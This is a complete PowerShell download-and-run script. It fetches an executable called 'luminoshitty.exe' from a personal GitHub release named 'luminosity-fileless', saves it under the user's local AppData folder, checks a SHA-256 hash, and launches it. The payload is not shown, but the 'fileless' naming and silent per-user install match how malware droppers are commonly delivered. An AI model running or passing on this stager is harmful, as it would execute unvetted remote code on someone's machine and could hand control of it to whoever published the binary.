
$ErrorActionPreference = "Stop"

$url = "https://github.com/fcmobilesomto-byte/luminosity-fileless/releases/download/v1.0.0/luminoshitty.exe"

$expectedHash = "78C4D1D4A91E455EF3EE64474D911BE87D2C79EB7A079E6F0DDC5FF7DCE97CF6"

$folder = "$env:LOCALAPPDATA\Luminosity"
$exe = Join-Path $folder "luminoshitty.exe"

New-Item -ItemType Directory -Force -Path $folder | Out-Null

Write-Host "Downloading Luminosity..."

Invoke-WebRequest -Uri $url -OutFile $exe

$actualHash = (Get-FileHash $exe -Algorithm SHA256).Hash

if ($actualHash -ne $expectedHash) {
    Remove-Item $exe -Force
    throw "File verification failed. Execution cancelled."
}

Write-Host "Verified successfully. Launching..."

Start-Process -FilePath $exe
